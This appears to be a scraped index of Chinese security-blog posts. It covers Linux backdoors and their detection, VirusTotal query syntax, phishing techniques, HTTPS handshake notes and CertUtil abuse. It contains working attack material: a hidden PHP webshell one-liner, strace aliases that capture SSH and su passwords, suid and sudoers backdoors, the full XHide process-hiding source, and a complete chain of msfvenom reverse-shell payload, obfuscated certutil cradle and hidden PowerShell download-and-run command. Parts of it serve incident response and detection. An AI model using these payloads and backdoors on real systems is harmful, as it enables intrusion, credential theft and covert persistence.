优点：通过查看/proc/pid/cmdline查看不到具体执行了什么命令或恶意脚本。缺点：仍可以看到有vim进程。排查：检测对应vim进程号虚拟目录的map文件是否有python字眼。\n障眼法之终端解析\\r导致的问题 echo -e \u0026#34;\u0026lt;?=\\`eval(\\$_POST[good]\\`);?\u0026gt;\\r\u0026lt;?=\u0026#39;PHP Test Page \u0026gt;||\u0026lt; \u0026#39;;?\u0026gt;\u0026#34; \u0026gt;/var/www/html/test.php 优点：通过终端命令例如cat、more等命令查看不到恶意代码,适合隐藏一句话木马等。缺点：易被检测，只是通过终端命令查看的时候看不到恶意代码，而通过其它读文件操作或者通过vim等工具进行编辑查看的时候仍可以查看到恶意代码。排查：使用编辑器或者一般的webshell扫描工具即可检测。\n障眼法之命令过长导致截断的问题 在使用ps进行进程查看的时候，不知道有没有人注意到这样一个问题，命令很长被截断，终端显示有时候为了美观，可能会截断较长的命令。同样在使用ps命令查看进程的时候，也存在这种问题。可以在其填充大量的空格进行截断，那么就可达到“进程隐藏”的效果。\n优点：简单。缺点：易被检测到。排查：通过ps -aux|grep 可疑进程的pid 即可显示完全，或者使用ps aux | less -+S、ps aux | cat或ps aux | most -w等命令进行查看。\nstrace记录ssh登录密码 alias ssh=\u0026#39;strace -o /tmp/sshpwd-`date \u0026#39;+%d%h%m%s\u0026#39;`.log \\\r-e read,write,connect -s2048 ssh\u0026#39; 也可记录 su密码 alias su=\u0026#39;strace -o /tmp/sshpwd-`date \u0026#39;+%d%h%m%s\u0026#39;`.log \\\r-e read,write,connect -s2048 su\u0026#39; 对第一行命令的解释：\n这个 Linux 命令使用了 alias 命令来创建一个新的别名 ssh，使得每次执行 ssh 命令时，都会附加一些额外的调试和日志记录功能。具体来说，这个命令将 ssh 命令重定义为 strace 命令的一部分。以下是这个命令的详细解释：\r1. alias ssh=\u0026#39;...\u0026#39;\r这个部分使用 alias 命令创建了一个别名 ssh。当你在命令行中输入 ssh 时，它实际上会执行等号右侧的命令。\r2. strace\rstrace 是一个调试工具，用于跟踪系统调用和信号。它可以显示程序执行过程中调用的所有系统调用，并输出相关信息。\r3. -o /tmp/sshpwd-date \u0026#39;+%d%h%m%s\u0026#39;.log\r这个选项指定了 strace 的输出日志文件：\r/tmp/sshpwd-... 是日志文件的路径和名称。\r`date \u0026#39;+%d%h%m%s\u0026#39;` 是一个命令替换，会执行 date 命令并获取当前日期和时间。\r%d：当前月份的日期（01 到 31）\r%h：当前月份的缩写名称（例如：Jan, Feb）\r%m：当前月份（01 到 12）\r%s：自 1970-01-01 00:00:00 UTC 到当前时间的秒数（UNIX 时间戳）\r这些选项组合在一起生成一个唯一的日志文件名，例如：/tmp/sshpwd-26Nov1126071747.log。\r4. -e read,write,connect\r这个选项指定 strace 仅跟踪特定的系统调用：\rread：跟踪读取操作。\rwrite：跟踪写入操作。\rconnect：跟踪网络连接操作。\r5. -s2048\r这个选项指定 strace 显示系统调用参数的最大字节数。在这里，设置为 2048 字节。\r6. ssh\r这是实际执行的 ssh 命令。重定义后的 ssh 命令将执行 strace 以监视系统调用，并将这些调用记录到指定的日志文件中。\r结论\r这个 alias 命令的功能是在每次执行 ssh 命令时，使用 strace 工具跟踪 ssh 命令的 read、write 和 connect 系统调用，并将这些调用记录到一个以当前日期和时间为名称的日志文件中。这对于调试和分析 ssh 命令的行为非常有用，因为它可以帮助你了解 ssh 在后台进行了哪些系统调用，以及这些调用的具体细节。 优点：改动较小。缺点：易被检测到。排查：通过排查shell的配置文件或者alias命令即可发现，例如~/.bashrc和~/.bash_profile文件查看是否有恶意的alias问题。(注意bash_profile是在登录的shell执行的，bashrc是在非登录的shell执行,即如果你只是想每次在登录的时候让它去执行，这个时候你可以把你的命令写在.bash_profile,如果你想每次打开一个新的终端的时候都去执行，那么应该把命令写在.bashrc中)。\n常见SSH后门之建立软连接 即另开一个端口进行ssh连接：\nln -sf /usr/sbin/sshd /home/su\r/home/su -oport=2222 优点：简单。缺点：易被检测到。排查：使用netstat -antlp查看可疑端口，然后ls -l 可执行文件即可。\n常见SSH后门之修改OpenSSH源码 通过在openssh源码中插入恶意代码重新编译并替换原有sshd文件。插入的恶意代码可以是将登录成功的用户密码发送到远程服务器或者记录到某个log文件中。\n优点：隐蔽性较好。排查：这种sshd后门一般可能会有一定的特征，可以通过strings sshd |grep \u0026lsquo;[1-9]{1,3}.[1-9]{1,3}.\u0026lsquo;或者通过strace 查看是否有可疑的写文件操作。\n常见SSH后门之创建authorized_keys 实现免密码登录的后门 在本地生成公私钥对，然后将公钥写入服务器的authorized_keys文件中，客户端使用私钥进行登录。\n排查：查看linux所有用户.ssh 目录下是否存在authroieze_keys文件以及文件中的内容。\n定时任务和开机启动项 一般的挖矿木马喜欢设置定时任务来进行驻留或进行分时段的挖矿。\n排查：一般通过crontab -l命令即可检测到定时任务后门。不同的linux发行版可能查看开机启动项的文件不大相同，Debian系linux系统一般是通过查看/etc/init.d目录有无最近修改和异常的开机启动项。而Redhat系的linux系统一般是查看/etc/rc.d/init.d或者/etc/systemd/system等目录。\n预加载型动态链接库后门 ld.so.preload 在linux下执行某个可执行文件之前，系统会预先加载用户定义的动态链接库的一种技术，这个技术可以重写系统的库函数，导致发生Hijack。strace 命令id的时候可以发现有预先去读取/etc/ld.so.preload文件(也可使用设置LD_PRELAOD环境变量方式)，如果我们将事先写好的恶意so文件位置写入ld.so.preload文件，这个时候就会达到“劫持”的效果。\n还有一种是通过修改动态链接器来加载恶意动态链接库的后门，通过替换或者修改动态链接器中的默认预加载配置文件/etc/ld.so.preload路径的rootkit，此方法更加隐蔽。\n排查：通过strace命令去跟踪预加载的文件是否为/etc/ld.so.preload，以及文件中是否有异常的动态链接库。以及检查是否设置LD_PRELOAD环境变量等。注意：在进行应急响应的时候有可能系统命令被替换或者关键系统函数被劫持（例如通过预加载型动态链接库后门），导致系统命令执行不正常，这个时候可以下载busybox。下载编译好的对应平台版本的busybox，或者下载源码进行编译通过U盘拷贝到系统上，因为busybox是静态编译的，不依赖于系统的动态链接库，busybox的使用类似如下 busybox ls，busybox ps -a。\n提权后门 suid提权后门，有时候需要放置一个提权后门方便我们拿到一个低权限shell的时候提权，例如 cp /bin/bash /bin/nf \u0026amp; chmod +s /bin/nf ,之后通过低权限账号登录的时候就可以执行/bin/nf 来以root用户执行命令。\nsudo 后门，同样是提权后门，在/etc/sudoers 文件中添加如下的内容 jenkins ALL=(ALL) NOPASSWD: ALL，使jenkins用户可以使用sudo执行任意命令。\n排查：suid后门可通过 find / -perm -4000 来查找suid程序，sudo后门可以检查 /etc/sudoers。\n进程注入 使用ptrace向进程中注入恶意so文件工具linux-inject\n内核级rootkit 内核级的rootkit也很多，这里简单推荐一个Diamorphine\n基于用户空间的进程隐藏手法之偷梁换柱型 通过替换系统中常见的进程查看工具（比如ps、top、lsof）的二进制程序，导致原先查看进程相关信息的工具（ps、top、lsof等）都被调包。\n基于用户空间的进程隐藏手法之HooK系统调用型 没看懂/(ㄒoㄒ)/~~\n基于用户空间的进程隐藏手法之伪造进程名型 在恶意代码中通过设置具有迷惑性的进程名字，以达到躲避管理员检查的目的。\n基于用户空间的进程隐藏手法之挂载覆盖型 利用mount —bind 将另外一个目录挂载覆盖至/proc/目录下指定进程ID的目录，我们知道ps、top等工具会读取/proc目录下获取进程信息，如果将进程ID的目录信息覆盖，则原来的进程信息将从ps的输出结果中隐匿。\n比如进程id为42的进程信息：mount -o bind /empty/dir /proc/42\n最后贴一下Github上的xhide源代码： #include \u0026lt;stdio.h\u0026gt;\r#include \u0026lt;unistd.h\u0026gt;\r#include \u0026lt;sys/stat.h\u0026gt;\r#include \u0026lt;sys/types.h\u0026gt;\r#include \u0026lt;string.h\u0026gt;\r#include \u0026lt;fcntl.h\u0026gt;\r#include \u0026lt;pwd.h\u0026gt;\r#include \u0026lt;grp.h\u0026gt;\rvoid usage(char *progname);\rint changeown (char *str)\r{\rchar user[256], *group;\rstruct passwd *pwd;\rstruct group *grp;\ruid_t uid;\rgid_t gid;\rmemset(user, \u0026#39;\\0\u0026#39;, sizeof(user));\rstrncpy(user, str, sizeof(user));\rfor (group = user; *group; group++)\rif (*group == \u0026#39;:\u0026#39;)\r{\r*group = \u0026#39;\\0\u0026#39;;\rgroup++;\rbreak;\r}\rif (pwd = getpwnam(user)) {\ruid = pwd-\u0026gt;pw_uid;\rgid = pwd-\u0026gt;pw_gid;\r} else uid = (uid_t) atoi(user);\rif (*group)\rif (grp = getgrnam(group)) gid = grp-\u0026gt;gr_gid;\relse gid = (gid_t) atoi(group);\rif (setgid(gid)) {\rperror(\u0026#34;Error: Can\u0026#39;t set GID\u0026#34;);\rreturn 0;\r}\rif (setuid(uid))\r{\rperror(\u0026#34;Error: Can\u0026#39;t set UID\u0026#34;);\rreturn 0;\r}\rreturn 1;\r}\rchar *fullpath(char *cmd)\r{\rchar *p, *q, *filename;\rstruct stat st;\rif (*cmd == \u0026#39;/\u0026#39;)\rreturn cmd;\rfilename = (char *) malloc(256);\rif (*cmd == \u0026#39;.\u0026#39;)\rif (getcwd(filename, 255) != NULL)\r{\rstrcat(filename, \u0026#34;/\u0026#34;);\rstrcat(filename, cmd);\rreturn filename;\r}\relse\rreturn NULL;\rfor (p = q = (char *) getenv(\u0026#34;PATH\u0026#34;); q != NULL; p = ++q)\r{\rif (q = (char *) strchr(q, \u0026#39;:\u0026#39;))\r*q = (char) \u0026#39;\\0\u0026#39;;\rsnprintf(filename, 256, \u0026#34;%s/%s\u0026#34;, p, cmd);\rif (stat(filename, \u0026amp;st) != -1\r\u0026amp;\u0026amp; S_ISREG(st.st_mode)\r\u0026amp;\u0026amp; (st.st_mode\u0026amp;S_IXUSR || st.st_mode\u0026amp;S_IXGRP || st.st_mode\u0026amp;S_IXOTH))\rreturn filename;\rif (q == NULL)\rbreak;\r}\rfree(filename);\rreturn NULL;\r}\rvoid usage(char *progname)\r{\rfprintf(stderr, \u0026#34;XHide - Process Faker, by Schizoprenic \u0026#34;\r\u0026#34;Xnuxer Research (c) 2002\\n\\nOptions:\\n\u0026#34;\r\u0026#34;-s string\\tFake name process\\n\u0026#34;\r\u0026#34;-d\\t\\tRun aplication as daemon/system (optional)\\n\u0026#34; \u0026#34;-u uid[:gid]\\tChange UID/GID, use another user (optional)\\n\u0026#34; \u0026#34;-p filename\\tSave PID to filename (optional)\\n\\n\u0026#34;\r\u0026#34;Example: %s -s \\\u0026#34;klogd -m 0\\\u0026#34; -d -p test.pid ./egg bot.conf\\n\\n\u0026#34;,progname);\rexit(1);\r}\rint main(int argc,char **argv)\r{\rchar c;\rchar fake[256];\rchar *progname, *fakename;\rchar *pidfile, *fp;\rchar *execst;\rFILE *f;\rint runsys=0, null;\rint j,i,n,pidnum;\rchar **newargv;\rprogname = argv[0];\rif(argc\u0026lt;2) usage(progname);\rfor (i = 1; i \u0026lt; argc; i++)\r{\rif (argv[i][0] == \u0026#39;-\u0026#39;)\rswitch (c = argv[i][1])\r{\rcase \u0026#39;s\u0026#39;: fakename = argv[++i]; break;\rcase \u0026#39;u\u0026#39;: changeown(argv[++i]); break; case \u0026#39;p\u0026#39;: pidfile = argv[++i]; break;\rcase \u0026#39;d\u0026#39;: runsys = 1; break;\rdefault: usage(progname); break;\r}\relse break;\r}\rif (!(n = argc - i) || fakename == NULL) usage(progname);\rnewargv = (char **) malloc(n * sizeof(char **) + 1);\rfor (j = 0; j \u0026lt; n; i++,j++) newargv[j] = argv[i];\rnewargv[j] = NULL;\rif ((fp = fullpath(newargv[0])) == NULL) { perror(\u0026#34;Full path seek\u0026#34;); exit(1); }\rexecst = fp;\rif (n \u0026gt; 1)\r{\rmemset(fake, \u0026#39; \u0026#39;, sizeof(fake) - 1);\rfake[sizeof(fake) - 1] = \u0026#39;\\0\u0026#39;;\rstrncpy(fake, fakename, strlen(fakename));\r// Kent, this is the key point.. keke\rnewargv[0] = fake;\r/*for (int i = 1; i \u0026lt; n; i++) newargv[i] = \u0026#34;\u0026#34;;*/\r}\relse newargv[0] = fakename;\rif (runsys) {\rif ((null = open(\u0026#34;/dev/null\u0026#34;, O_RDWR)) == -1)\r{\rperror(\u0026#34;Error: /dev/null\u0026#34;);\rreturn -1;\r}\rswitch (fork())\r{\rcase -1:\rperror(\u0026#34;Error: FORK-1\u0026#34;);\rreturn -1;\rcase 0:\rsetsid();\rswitch (fork())\r{\rcase -1:\rperror(\u0026#34;Error: FORK-2\u0026#34;);\rreturn -1;\rcase 0:\rumask(0);\rclose(0);\rclose(1);\rclose(2);\rdup2(null, 0);\rdup2(null, 1);\rdup2(null, 2);\rbreak;\rdefault:\rreturn 0;\r}\rbreak;\rdefault:\rreturn 0;\r}\r}\rwaitpid(-1, (int *)0, 0); pidnum = getpid();\rif (pidfile != NULL \u0026amp;\u0026amp; (f = fopen(pidfile, \u0026#34;w\u0026#34;)) != NULL)\r{\rfprintf(f, \u0026#34;%d\\n\u0026#34;, pidnum);\rfclose(f);\r}\rfprintf(stderr,\u0026#34;==\u0026gt; Fakename: %s PidNum: %d\\n\u0026#34;,fakename,pidnum); execv(execst, newargv);\rperror(\u0026#34;Couldn\u0026#39;t execute\u0026#34;);\rreturn -1;\r} 参考：\nlinux常见backdoor及排查技术\n聊一聊Linux下进程隐藏的常见手法及侦测手段\n","date":"2024-11-22T17:49:53+08:00","permalink":"https://wander1ng.com/post/linux%E5%B8%B8%E8%A7%81%E5%90%8E%E9%97%A8%E5%8F%8A%E6%8E%92%E6%9F%A5%E6%8A%80%E6%9C%AF/","section":"post","tags":["应急响应"],"title":"Linux常见后门及排查技术"},{"categories":null,"contents":"VT高级语法： Network activity：behaviour_network:\u0026ldquo;202.117.170.240\u0026rdquo;\nNetwork activity：behaviour_network:\u0026quot;/vpnchecker.php\u0026quot;\nFilesystem operations：behaviour_files:\u0026ldquo;C:\\\\Users\\\\\u0026lt;\\USER\u0026gt;\\AppData\\Local\\Temp\\pnw2vuyz.e5s.ps1\u0026rdquo;\nProcesses execution：behaviour_processes:\u0026ldquo;powershell.exe -ep bypass -File C:\\Users\\Johnson\\AppData\\Local\\Temp\\4.ps1\u0026rdquo;\n不直接相关的恶意行为组合：behaviour_network:tinyurl.com and behaviour_processes:powershell\n寻找可信签名但反病毒引擎检出率高的样本：signature:\u0026quot;© Microsoft Corporation. All rights reserved.\u0026quot; tag:signed not (tag:invalid-signature or tag:revoked-cert) fs:2022-01-01+ p:5+\n寻找带有特定cookie的url：entity:url cookie:\u0026ldquo;njnmsdkfsdfbiuonsdkfnsdfl\u0026rdquo;\n对安卓包的搜索：androguard_package:org.xmlpush.v3\n文件名：type:document name:\u0026ldquo;Standard Chartered\u0026rdquo; p:1+\nURL：entity:url title:\u0026ldquo;JP Morgan\u0026rdquo; p:5+\nemail：type:email have:email_attachment tag:exploit\nIOS野生恶意文件：(type:apple OR type:mac) have:in_the_wild p:5+\nitw:cdn.discordapp.com p:5+\nentity：分为file、url、ip、domain、collection\nitw：指“In The Wild”，主要描述一种病毒活动状态，即该病毒已在互联网上广泛传播，并对日常的计算机运行产生实际影响。因此，当我们说一个病毒是\u0026quot;In The Wild\u0026quot; （缩写为ITW）的，这意味着它不仅仅是在实验室环境中的假设或可能性，而是在现实世界中已经存在并对用户和系统构成威胁了。\n对特定组织进行查询：entity:collection(name:apt28 or tag:apt28 or name:Sofacy or tag:Sofacy)\np:5+表示至少被5个反病毒引擎监测到\n","date":"2024-11-21T10:24:27+08:00","permalink":"https://wander1ng.com/post/vt%E9%AB%98%E7%BA%A7%E8%AF%AD%E6%B3%95/","section":"post","tags":["Cyber threat hunting"],"title":"VT高级语法"},{"categories":null,"contents":"一种未曾见过的钓鱼手法：使用iframe元素填充页面 虽然但是，直接看url也能看出不是官方页面。\n该页面实际上被一个满屏的iframe给填充了：\n只是在直接的钓鱼页面过程中加上了一层跳转，实际上该是黑的域名还是黑的。\n直接投递exe类钓鱼邮件 一般都会对样本进行加密压缩规避杀软，同时将解压密码写在正文中。APT-Q-15这样做过，虽然投递的是msi。\n钓鱼邮件下发漏洞文档 最常见的CVE2017-11822，从C2远程加载exe\nMacro4.0宏文档投递 VBA（Visual Basic for Applications）是为Microsoft Office软件开发的一种宏语言。它可以用于各种Office应用程序，如Excel、Word、PowerPoint等。VBA有强大的内置函数和对象模型，可以轻松地扩展Office应用程序的功能，从而提高工作效率。VBA也可以用于创建自己的用户界面和编写各种业务应用程序。\nVBS（Visual Basic Script）是一种通用的脚本语言，它通常用于Windows操作系统中的各种任务和自动化操作。VBS通常用于运行脚本文件、自动化常规任务、设置环境变量、执行Windows命令等等。VBS相比于VBA，不依赖于Office应用程序，并且可以执行操作系统级别的任务。\n但VBS不等于XLM宏。\nVBA XLM宏 Excel5.0技术 Excel4.0技术 依赖于office组件执行 依赖于wscript.exe 语法相同 语法相同 XLM宏的创建比较简单，直接在某个工作表右键选择插入MS Excel4.0宏表。\nExcel则会自动创建一个名为Macro1的新工作表，中文系统下为\u0026lt;宏1\u0026gt;，在创建的新工作表中，可以执行宏指令。\n使用XLM宏比常见的VBA宏具有更好的免杀性。原因主要是：\nXLM宏和VBA宏的设计理念不同，导致了宏代码在文件结构中的呈现不同。和VBA宏一样的是，在文件打开时，Excel依旧会提醒用户\nBecause of your security settings, macros have been disabled. To run macros, you need to reopen this workbook, and then choose to enable macros. For more information about enabling macros, click Help.\n让用户决定是否要启用宏。不同的是，当用户单击启用之后，ALT + F11打开宏代码窗口，却并不能看到宏代码。也不能通过一些常见的宏代码提取工具检测分析宏。这是因为默认情况下，XLM宏代码存储在xl\\Macrosheets\\文件夹下的Sheet1.xml中。打开该xml文件，可以清晰的看到刚才在Excel工作表中插入的宏代码。\n","date":"2024-11-20T18:42:55+08:00","permalink":"https://wander1ng.com/post/%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6%E6%B5%85%E6%9E%90%E5%8F%82%E8%80%83%E8%AF%AD%E9%9B%80p1ut0/","section":"post","tags":["APT"],"title":"钓鱼邮件浅析(参考语雀P1ut0)"},{"categories":null,"contents":"0x01常见抓包工具Charles/Fiddler/Wireshark区别 为什么Charles等抓包工具或浏览器控制台看到的HTTPS是明文的？\nHTTPS其实相当于HTTP+TLS,HTTP是明文操作，所有的加解密操作都在TLS这边。\n浏览器控制台能看到明文HTTPS是因为浏览器是应用层，所以浏览器的输出都是TLS解密过的。\nCharles能看到是因为Charles抓包的时候有一个信任证书的操作，类似于中间人攻击。\nFiddler和Charles都是用于抓取应用层协议等上层的数据，都是建立连接成功以后的数据。而Wireshark可以抓取所有协议的数据包，因为直接读取网卡数据。需要抓取HTTPS建立连接成功前的过程，所以选择Wireshark。\nCurl命令只发送一个请求，如果用浏览器打开百度，页面的各种资源也会发送请求，对分析造成很多不必要的数据包。\n0x01为什么指数数字签名证书需要hash一次 给证书明文签名和给明文的hash签名其实区别不大，但是对hash签名能让非对称加密的速度快很多。\n0x02传输流程 三次握手 客户端发送client_hello 服务端发送server_hello 服务端发送证书 服务端发送Server Key Exchange 服务端发送Server Hello Done 客户端发送Client_key_exchange+Change_cipher_spec+Encrypted_handshake_message 服务端发送New Session Ticket 服务端发送Change_cipher_spec 服务端发送Encrypted_handshake_message 完成密钥协商，开始发送数据 完成数据发送，四次TCP挥手：客户端FIN，服务端ACK，服务端FIN，客户端ACK。 ","date":"2024-11-15T10:29:53+08:00","permalink":"https://wander1ng.com/post/%E5%A4%8D%E4%B9%A0https%E6%8F%A1%E6%89%8B%E6%B5%81%E7%A8%8B/","section":"post","tags":["网络基础设施"],"title":"复习HTTPS握手流程及相关扫描器"},{"categories":null,"contents":"CertUtil是一个Windows的内置程序，用于管理Windows中的证书，使用此程序，可以在Windows中安装，备份，删除，管理和执行与证书和证书存储相关的各种功能。\n经典用法是处理Base64编码的数据：\nC:\\Windows\\Temp\u0026gt; certutil.exe -decode input.txt output.exe\r//-decode参数用于将编码的文件解码为其原始的二进制形式\r//第一二个必选参数分别为输入文件名、输出文件名 也能够从远程URL下载证书或者任何其它文件\n语法： “certutil.exe -urlcache -split -f [URL] output.file”\ncertutil.exe -urlcache -split -f http://37.44.212.223/miner.exe C:/Windows/temp/yete.exe -f 覆盖现有文件。有值的命令行选项。后面跟要下载的文件 url。•-split 保存到文件。无值的命令行选项。加了的话就可以下载到当前路径，不加就下载到了默认路径。•-URLCache 显示或删除URL缓存条目。无值的命令行选项。（certutil.exe 下载有个弊端，它的每一次下载都有留有缓存。）\n两种功能进行结合：首先对恶意文件进行base64编码，以绕过AV检测， 然后在使用CertUtil.exe下载后再对其进行解码。\nC:\\Windows\\Temp\u0026gt;certutil.exe -urlcache -split -f \u0026#34;https://hackers.home/badcontent.txt\u0026#34; bad.txt\rC:\\Windows\\Temp\u0026gt;certutil.exe -decode bad.txt bad.exe 攻击者为什么喜欢用CertUtil？因为它是Windows内置的程序，CertUtil可能会被列入白名单。其实利用合法的Windows植入恶意软件非常常见，比如Windows regsvr32.exe就是以类似的方式使用。\n使用Certutil.exe下载文件，下载完成以后一定记得delete 清理痕迹。\nC:\\\u0026gt; certutil.exe -urlcache -split -f http://lyshark.com/lyshark.log\rC:\\\u0026gt; certutil.exe -urlcache -split -f http://lyshark.com/lyshark.log delete 还可以用来校验hash值，这个之前使用过\ncertutil -hashfile mimikatz.exe MD5 //检验MD5certutil -hashfile mimikatz.exe SHA1 //检验SHA1certutil -hashfile mimikatz.exe SHA256 //检验SHA256 Certutil命令配合PS反弹后门\nPowerShell 混淆框架：https://github.com/danielbohannon/Invoke-CradleCrafter\n1.在加载PowerShell脚本之前，先来进行数字签名，运行命令。\nPS C:\\Invoke-CradleCrafter\u0026gt; Set-ExecutionPolicy Bypass\r执行策略更改\r执行策略可帮助你防止执行不信任的脚本。更改执行策略可能会产生安全风险，如 https:/go.microsoft.com/fwlink/?LinkID=135170\r中的 about_Execution_Policies 帮助主题所述。是否要更改执行策略? Y 2.使用方法，执行两条命令，加载框架。\nPS C:\\Invoke-CradleCrafter\u0026gt; Import-Module .\\Invoke-CradleCrafter.ps1\rPS C:\\Invoke-CradleCrafter\u0026gt; Invoke-CradleCrafter\rInvoke-CradleCrafter\r_____ _ ,\r\\_ \\_ ____ _____ | | _____ /( __________\r/ /\\/ \u0026#39;_ \\ \\ / / _ \\| |/ / _ \\_____ | \u0026gt;:==========`\r/\\/ /_ | | | \\ V / (_) | \u0026lt; __/_____| )(\r\\____/ |_| |_|\\_/ \\___/|_|\\_\\___| \u0026#34;\u0026#34;\r___ _ _ ___ __ _\r/ __\\ __ __ _ __| | | ___ / __\\ __ __ _ / _| |_ ___ _ __\r/ / | \u0026#39;__/ _` |/ _` | |/ _ \\/ / | \u0026#39;__/ _` | |_| __/ _ \\ \u0026#39;__|\r/ /__| | | (_| | (_| | | __/ /__| | | (_| | _| || __/ |\r\\____/_| \\__,_|\\__,_|_|\\___\\____/_| \\__,_|_| \\__\\___|_|\rTool :: Invoke-CradleCrafter\rAuthor :: Daniel Bohannon (DBO)\rTwitter :: @danielhbohannon\rBlog :: http://danielbohannon.com\rGithub :: https://github.com/danielbohannon/Invoke-CradleCrafter\rVersion :: 1.1\rLicense :: Apache License, Version 2.0\rNotes :: If(!$Caffeinated) {Exit}\rHELP MENU :: Available options shown below: 3.MSF攻击主机，生成payload，并将生成好的payload放入网站根目录，保证能够正常访问。\n[root@localhost ~]# msfvenom -p windows/x64/meterpreter/reverse_tcp \\\r\u0026gt; lhost=192.168.1.30 lport=8888 -e cmd/powershell_base64 \\\r\u0026gt; -f psh -o lyshark.txt\r[root@localhost ~]# cp -a lyshark.txt /var/www/html/\r[root@localhost ~]# systemctl restart httpd 4.powershell 框架设置指定好的URL链接。\nInvoke-CradleCrafter\u0026gt; set URL http://lyshark.com/lyshark.txt\rSuccessfully set Url:\rhttp://lyshark.com/lyshark.txt 5.分别执行以下命令完成初始化，这里如果报错请添加环境变量。\nInvoke-CradleCrafter\u0026gt; MEMORY\rChoose one of the below Memory options:\r[*] MEMORY\\PSWEBSTRING PS Net.WebClient + DownloadString method\r[*] MEMORY\\PSWEBDATA PS Net.WebClient + DownloadData method\r[*] MEMORY\\PSWEBOPENREAD PS Net.WebClient + OpenRead method\r[*] MEMORY\\NETWEBSTRING .NET [Net.WebClient] + DownloadString method (PS3.0+)\r[*] MEMORY\\NETWEBDATA .NET [Net.WebClient] + DownloadData method (PS3.0+)\r[*] MEMORY\\NETWEBOPENREAD .NET [Net.WebClient] + OpenRead method (PS3.0+)\r[*] MEMORY\\PSWEBREQUEST PS Invoke-WebRequest/IWR (PS3.0+)\r[*] MEMORY\\PSRESTMETHOD PS Invoke-RestMethod/IRM (PS3.0+)\r[*] MEMORY\\NETWEBREQUEST .NET [Net.HttpWebRequest] class\r[*] MEMORY\\PSSENDKEYS PS SendKeys class + Notepad (for the lulz)\r[*] MEMORY\\PSCOMWORD PS COM object + WinWord.exe\r[*] MEMORY\\PSCOMEXCEL PS COM object + Excel.exe\r[*] MEMORY\\PSCOMIE PS COM object + Iexplore.exe\r[*] MEMORY\\PSCOMMSXML PS COM object + MsXml2.ServerXmlHttp\r[*] MEMORY\\PSINLINECSHARP PS Add-Type + Inline CSharp\r[*] MEMORY\\PSCOMPILEDCSHARP .NET [Reflection.Assembly]::Load Pre-Compiled CSharp\r[*] MEMORY\\CERTUTIL Certutil.exe + -ping Argument Invoke-CradleCrafter\\Memory\u0026gt; CERTUTIL\r[*] Name :: Certutil\r[*] Description :: PowerShell leveraging certutil.exe to download payload as string\r[*] Compatibility :: PS 2.0+\r[*] Dependencies :: Certutil.exe\r[*] Footprint :: Entirely memory-based\r[*] Indicators :: powershell.exe spawns certutil.exe certutil.exe [*] Artifacts :: C:\\Windows\\Prefetch\\CERTUTIL.EXE-********.pf AppCompat Cache Invoke-CradleCrafter\\Memory\\Certutil\u0026gt; ALL\rChoose one of the below Memory\\Certutil\\All options to APPLY to current cradle:\r[*] MEMORY\\CERTUTIL\\ALL\\1 Execute ALL Token obfuscation techniques (random order)\rInvoke-CradleCrafter\\Memory\\Certutil\\All\u0026gt; 1\rExecuted:\rCLI: Memory\\Certutil\\All\\1\rFULL: Out-Cradle -Url \u0026#39;http://lyshark.com/lyshark.txt\u0026#39; -Cradle 17 -TokenArray @(\u0026#39;All\u0026#39;,1)\rResult:\rSV 1O6 \u0026#39;http://lyshark.com/lyshark.txt\u0026#39;;.(Get-Command *ke-*pr*) ((C:\\Windows\\System32\\certutil /ping (Get-Item Variable:\\1O6).Value|\u0026amp;(Get-Variable Ex*xt).Value.InvokeCommand.(((Get-Variable Ex*xt).Value.InvokeCommand.PsObject.Methods|?{(Get-Variable _ -ValueOn).Name-ilike\u0026#39;*and\u0026#39;}).Name).Invoke((Get-Variable Ex*xt).Value.InvokeCommand.(((Get-Variable Ex*xt).Value.InvokeCommand|GM|?{(Get-Variable _ -ValueOn).Name-ilike\u0026#39;*Com*e\u0026#39;}).Name).Invoke(\u0026#39;*el*-O*\u0026#39;,$TRUE,1),[Management.Automation.CommandTypes]::Cmdlet)-Skip 2|\u0026amp;(Get-Variable Ex*xt).Value.InvokeCommand.(((Get-Variable Ex*xt).Value.InvokeCommand.PsObject.Methods|?{(Get-Variable _ -ValueOn).Name-ilike\u0026#39;*and\u0026#39;}).Name).Invoke((Get-Variable Ex*xt).Value.InvokeCommand.(((Get-Variable Ex*xt).Value.InvokeCommand|GM|?{(Get-Variable _ -ValueOn).Name-ilike\u0026#39;*Com*e\u0026#39;}).Name).Invoke(\u0026#39;*el*-O*\u0026#39;,$TRUE,1),[Management.Automation.CommandTypes]::Cmdlet)-SkipLa 1)-Join\u0026#34;`r`n\u0026#34;)\rChoose one of the below Memory\\Certutil\\All options to APPLY to current cradle:\r[*] MEMORY\\CERTUTIL\\ALL\\1 Execute ALL Token obfuscation techniques (random order) 6.将上方混淆后的内容保存为 crt.txt 然后进行encode加密\nC:\\Users\\lyshark\\Desktop\u0026gt;certutil -encode crt.txt crt.cer\r输入长度 = 912\r输出长度 = 1310\rCertUtil: -encode 命令成功完成。 7.将生成的 crt.cer放入服务器的根目录下，保证能够访问，然后运行msfconsole控制台，并侦听事件。\n[root@localhost ~]# cp -a crt.cer /var/www/html/\rmsf5 \u0026gt; use exploit/multi/handler\rmsf5 exploit(multi/handler) \u0026gt; set payload windows/meterpreter/reverse_tcp\rpayload =\u0026gt; windows/meterpreter/reverse_tcp\rmsf5 exploit(multi/handler) \u0026gt; set lhost 192.168.1.30\rlhost =\u0026gt; 192.168.1.7\rmsf5 exploit(multi/handler) \u0026gt; set lport 8888\rlport =\u0026gt; 8888\rmsf5 exploit(multi/handler) \u0026gt; exploit -j -z 8.最终靶机执行，以下命令。\npowershell.exe ‐Win hiddeN ‐Exec ByPasS add‐content ‐path %APPDATA%\\crt.cer (New‐Object Net.WebClient).DownloadString(\u0026#39;http://lyshark.com/crt.cer\u0026#39;); certutil ‐decode %APPDATA%\\crt.cer %APPDATA%\\stage.ps1 \u0026amp; start /b c\rmd /c powershell.exe ‐Exec Bypass ‐NoExit ‐File %APPDATA%\\stage.ps1 \u0026amp; start /b cmd /c del %APPDATA%\\crt.cer 这种情况下powershell脚本不会落地\n没想到一个校验证书的程序能有这么多的功能\u0026hellip;\n参考：\n干货 | Certutil在渗透中的利用和详解\ncertutil 命令配合PS反弹后门\n攻击者利用CertUtil.exe植入恶意软件\n","date":"2024-11-14T16:06:31+08:00","permalink":"https://wander1ng.com/post/certutil%E5%9C%A8%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8/","section":"post","tags":["横向移动"],"title":"Certutil在渗透中的使用"},{"categories":null,"contents":"Msi文件：即microsoft installer的简写，msi文件就是window installer的数据包，把所有和安装文件相关（即下文说的windows 